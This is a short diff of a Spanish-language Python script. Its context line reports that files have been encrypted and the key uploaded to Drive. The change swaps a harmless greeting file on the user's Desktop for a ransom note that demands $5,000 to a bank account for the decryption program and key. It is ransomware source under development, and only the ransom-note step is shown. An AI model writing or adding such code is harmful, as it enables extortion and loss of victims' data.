@@ -116,7 +116,7 @@ if __name__ == "__main__":
 
     # Crear archivo saludo.txt en el escritorio
     escritorio = os.path.join(ruta_home, "Desktop")
-    with open(os.path.join(escritorio, "saludo.txt"), "w") as f:
-        f.write("hola como estas?")
+    with open(os.path.join(escritorio, "instrucciones_rescate.txt"), "w") as f:
+        f.write("Hola. Tus archivos fueron encriptados. Para recuperarlos reposita $5.000 a la cuenta RUT 12.345-k para que te enviemos el programa y clave necesarios para desencriptar tus datos")
 
     print("\n[🔒] Encriptación completada y clave subida a Drive.")
